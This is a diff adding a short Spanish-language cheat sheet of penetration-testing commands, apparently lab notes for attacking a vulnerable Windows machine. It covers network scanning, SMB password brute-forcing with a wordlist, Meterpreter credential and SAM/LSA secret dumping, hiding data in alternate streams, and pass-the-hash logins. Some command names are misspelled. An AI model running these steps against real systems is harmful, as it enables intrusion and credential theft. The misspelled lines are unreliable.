@@ -1,0 +1,22 @@
+sudo nmap -p- -sCV -vvv -min-rate 5000 direccion [ip-maquina-vulnerable]
+
+ifconfig
+sudo nmap -p- --open -sCV -vvv -min-rate 5000 10.0.0.0/24
+sudo nmap -script "vuln and safe" -p 445 -vvv 10.0.0.0/24
+sudo nmap -p 445 -vvv -sCV -min-rate 5000 --open [ip-maquina-vulnerable]
+sudo nmap -script "vuln and safe" -vvv -p 445 [ip-maquina-vulnerable]
+sudo crackmapexec smb [ip-maquina-vulnerable]
+sudo crackmapexec smb [ip-maquina-vulnerable] -u 'Admin' -p /usr/share/wordlists/rockyou.txt.gz | grep "[+]"
+getuid
+sysinfo
+ls
+
+echo [mensaje] > archivo:archivo
+more < archivo:archivo
+
+load wiki
+creeds_all
+lsa_dump_sam
+lsa_dump_secrets
+crackmapexec smb [ip-maquina-vulnerable] -u "" -H ""
+smbmap -u "" -p "" -H [ip-maquina-vulnerable]
